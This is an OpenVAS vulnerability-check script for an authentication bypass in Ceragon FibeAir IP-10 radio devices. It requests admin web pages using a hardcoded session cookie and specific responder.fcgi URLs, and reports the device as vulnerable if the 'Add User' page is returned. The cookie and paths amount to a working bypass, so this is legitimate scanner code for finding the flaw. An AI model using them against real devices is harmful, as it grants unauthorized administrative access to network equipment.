###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ceragon_fibeair_auth_bypass_vuln.nasl 11569 2018-09-24 10:29:54Z asteins $
#
# Ceragon IP-10 Authentication Bypass Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106103");
  script_version("$Revision: 11569 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-24 12:29:54 +0200 (Mon, 24 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-06-21 11:09:47 +0700 (Tue, 21 Jun 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Ceragon IP-10 Authentication Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Ceragon IP-10 is prone to an authentication bypass vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Ceragon FibeAir IP-10 devices do not properly ensure that a user
has authenticated before granting them access to the web interface of the device.");

  script_tag(name:"impact", value:"A remote attacker may gain administrative access to the web UI.");

  script_tag(name:"affected", value:"Version prior to 7.2.0");

  script_tag(name:"solution", value:"Upgrade to Version 7.2.0 or later");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Jun/34");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 80);

res = http_get_cache(port: port, item: "/");

if ("Web Management" >< res && "./responder.fcgi" >< res) {
  cookie = "ALBATROSS=0-4-11";

  urls = make_list('/responder.fcgi1?winid=106&winname=Users%20%26%20Groups&slot=1&mainslot=1',
                   '/responder.fcgi1?winid=109&winname=Users%20%26%20Groups&slot=1&mainslot=1',
                   '/responder.fcgi1?winid=103&winname=Users%20%26%20Groups&slot=1&mainslot=1',
                   '/responder.fcgi0?winid=89&winname=Users%20%26%20Groups&slot=0');

  foreach url (urls) {
    if (http_vuln_check(port: port, url: url, pattern: "Add User", check_header: TRUE,
                        extra_check: "System up time", cookie: cookie)) {
      security_message(port: port);
      exit(0);
    }
  }
}

exit(0);
